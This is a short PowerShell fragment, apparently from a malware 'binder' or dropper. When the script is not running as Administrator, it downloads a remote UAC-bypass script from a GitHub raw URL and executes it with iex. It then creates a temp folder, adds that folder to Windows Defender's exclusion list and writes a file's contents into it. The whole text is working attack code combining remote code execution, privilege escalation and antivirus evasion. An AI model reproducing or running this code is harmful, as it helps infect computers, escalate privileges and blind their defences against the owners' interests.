if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/uacbypass.ps1" -UseBasicParsing).Content
    Stop-Process $pid -Force
}

$directoryPath = "$env:temp\bindergood"
New-Item -Path $directoryPath -ItemType Directory
Add-MpPreference -ExclusionPath $directoryPath
$path = "$directoryPath\$name"
Set-Content -Path $path -Value $Filecontent
